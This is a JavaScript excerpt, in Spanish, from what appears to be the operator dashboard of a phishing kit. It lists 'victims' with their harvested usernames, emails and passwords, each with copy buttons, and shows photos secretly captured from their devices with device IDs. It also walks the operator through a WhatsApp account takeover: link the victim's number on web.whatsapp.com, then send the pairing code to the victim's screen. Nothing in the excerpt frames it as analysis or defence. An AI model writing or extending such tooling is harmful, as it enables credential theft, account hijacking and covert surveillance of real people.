...
function mostrarVictimas(snap) {
    ...
    snap.forEach(d => {
        ...
        const borderColor = esWhatsApp ? "#25D366" : esFoto ? "#ff6600" : "#00ff00";
        ...
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
            <strong style="color:${borderColor};font-size:14px;">${v.template || "Sin template"}</strong>
        ...
        if (esFoto && (v.fotoMiniatura || v.fotoOriginal)) {
            ...
            <div style="margin:10px 0;text-align:center;">
                <div style="background:rgba(255,102,0,0.1);border:1px solid #ff6600;border-radius:8px;padding:10px;display:inline-block;">
                    <div style="color:#ff6600;font-size:11px;margin-bottom:6px;">
                        📸 FOTO CAPTURADA ${v.count ? `(${v.count}/5)` : ""}
                    </div>
                    <img src="${thumb}"
                        style="width:140px;height:140px;object-fit:cover;border-radius:8px;border:2px solid #ff6600;cursor:pointer;box-shadow:0 0 15px #ff660066;"
                    ...
                    <div style="margin-top:6px;display:flex;gap:6px;justify-content:center;">
                        <button onclick="descargarFoto('${encoded}','${docId}')"
                            style="background:#ff6600;color:#000;border:none;padding:4px 10px;border-radius:4px;font-size:11px;font-weight:bold;cursor:pointer;">
                            ⬇ Descargar
                        </button>
                        <button onclick="mostrarFotoCompleta('${encoded}')"
                            style="background:#333;color:#ff6600;border:1px solid #ff6600;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;">
                            🔍 Ver completa
                        </button>
                    </div>
                </div>
            </div>`;
            if (v.deviceId) html += `<div style="color:#555;font-size:10px;margin-top:4px;word-break:break-all;">📱 ${v.deviceId}</div>`;
        }
        ...
        if (esWhatsApp) {
            ...
            <div style="margin-top:10px;padding:12px;background:rgba(37,211,102,0.08);border-radius:6px;border:1px solid #25D366;">
                ...
                <div style="font-size:11px;color:#aaa;margin-bottom:8px;">
                    1. Abre <strong style="color:#25D366">web.whatsapp.com</strong> en tu navegador<br>
                    2. Click en "Vincular con número de teléfono"<br>
                    3. Ingresa el número de la víctima<br>
                    4. Copia el código de 8 dígitos que aparece<br>
                ...
                <div style="display:flex;gap:6px;">
                    <input type="text" id="input-code-${docId}"
                        placeholder="Ej: ABCD1234"
                        maxlength="8"
                        style="flex:1;background:#000;border:1px solid #25D366;color:#25D366;padding:8px;border-radius:4px;text-transform:uppercase;font-family:monospace;font-size:16px;letter-spacing:3px;text-align:center;"
                    />
                ...
                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;">
                    ${v.status === "mostrando_codigo" ? "✅ Código mostrándose en pantalla de víctima" : "⌛ Esperando envío de código..."}
                </div>
            </div>`;
        }

        // ══ BLOQUE CREDENCIALES ══════════════════════════════
        if (!esWhatsApp && !esFoto) {
            const labelUser = esTikTok || esInstagram ? "Usuario" : "Correo";
            if (v.numero) html += `<div style="margin:4px 0;">Número: <b style="color:#0ff;">${v.numero}</b></div>`;
            if (v.correo || v.usuario) html += `
            <div style="margin:4px 0;">
                ${labelUser}: <b style="color:#ff0;">${v.correo || v.usuario}</b>
                <button onclick="navigator.clipboard.writeText('${(v.correo||v.usuario||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                    style="background:none;border:1px solid #ff0;color:#ff0;padding:1px 6px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:5px;">
                    Copiar
                </button>
            </div>`;
            if (v.contraseña || v.password) html += `
            <div style="margin:4px 0;">
                Contraseña: <b style="color:#f0f;">${v.contraseña || v.password}</b>
                <button onclick="navigator.clipboard.writeText('${(v.contraseña||v.password||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                    style="background:none;border:1px solid #f0f;color:#f0f;padding:1px 6px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:5px;">
                    Copiar
                </button>
            </div>`;
        }
        ...
        <div style="margin-top:10px;text-align:right;">
            <button onclick="eliminarVictimaIndividual('${docId}')"
                style="background:#1a0000;border:1px solid #f00;color:#f00;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;">
                🗑 Eliminar
            </button>
        </div>
        </div>`;
...
window.enviarCodigoAVictima = async (docId) => {
    ...
    if (!codigo || codigo.length < 4) { mostrarNotif("❌ Ingresa un código válido"); return; }
    try {
...
window.regresarAVictimas = () => {
    $id("vista-completa-foto").style.display = "none";
    $id("registros").style.display           = "block";
};
